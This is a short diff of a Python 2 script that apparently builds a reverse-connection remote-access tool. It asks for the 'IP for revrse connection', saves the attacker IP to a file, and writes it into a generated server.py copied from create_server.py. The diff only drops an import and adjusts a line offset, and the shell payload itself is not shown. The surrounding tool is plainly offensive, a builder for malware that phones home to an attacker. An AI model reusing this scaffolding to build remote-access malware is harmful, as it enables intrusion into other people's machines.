@@ -11,7 +11,6 @@ from urllib2 import urlopen
 from shutil import copyfile
 reload(sys)
 sys.setdefaultencoding('utf-8')
-import os, cgi
 attacker_ip = raw_input('IP for revrse connection: ')
 with open('attacker_ip.txt', 'w') as hostname:
      hostname.write(attacker_ip)
@@ -42,7 +41,7 @@ def py2crypt():
 with open('create_server.py') as f1:
     with open('server.py', 'w') as f2:
         lines = f1.readlines()
-        i = 53
+        i = 52
         f2.write("global attacker_ip\nattacker_ip = " + '\'' + attacker_ip+ '\'' + '\n')
         while(i<len(lines)-1):
             f2.write(lines[i])
